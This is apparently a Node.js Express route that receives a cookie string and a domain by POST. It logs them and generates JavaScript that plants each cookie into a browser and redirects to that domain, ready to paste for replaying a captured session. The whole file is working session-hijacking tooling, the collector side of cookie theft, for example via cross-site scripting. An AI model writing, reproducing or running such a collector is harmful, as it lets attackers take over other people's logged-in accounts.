var express = require('express');
var router = express.Router();

/* GET home page. */
router.post('/session', function(req, res, next) {
  console.log("----------"+req.body.domain+"---------");
    var cookie = req.body.cookie;
	var arrCookie= cookie.split(';');
	//Generator javascript (import cookie) 
	var salida = "var date = new Date();date.setTime(date.getTime()+(1*24*60*60*1000));var expires = '; expires='+date.toGMTString();"
	for(var i =0;i<arrCookie.length;i++){
		var name = arrCookie[i].split('=')[0].trim();
		var value = arrCookie[i].split('=')[1].trim();
		salida +="document.cookie = '"+name+"="+value+"'+expires+'; path=/';" 
	}
	//add reload (F5)
	salida+="document.location.href='http://"+req.body.domain+"';";
	console.log(salida);
	console.log('-----------------------------------------');
	res.send("foorbar");
  
});

module.exports = router;
